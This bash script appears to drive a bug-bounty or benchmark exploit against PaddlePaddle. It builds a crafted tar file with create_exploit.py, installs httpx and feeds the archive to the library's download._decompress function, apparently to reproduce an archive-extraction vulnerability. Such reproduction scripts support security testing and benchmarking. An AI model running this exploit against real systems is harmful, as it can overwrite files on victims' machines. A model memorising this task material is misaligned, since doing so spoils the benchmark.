#!/bin/bash

set -e

echo "$(pwd)"
# pwd = /app/paddlepaddle/bounties/bounty_0/exploit_files
# switch to the folder containing this script for relative paths
cd "$(dirname "$0")"

echo "Creating exploit tar file..."
python create_exploit.py

echo "Running exploit..."

# copy vulnerable code and use directly
cd ../../../codebase/python/paddle/utils

# httpx is a requirement, else fails
pip install httpx

# now exploit the bug
python -c "import download; download._decompress('../../../../bounties/bounty_0/exploit_files/exploit.tar')"

echo "Exploit completed"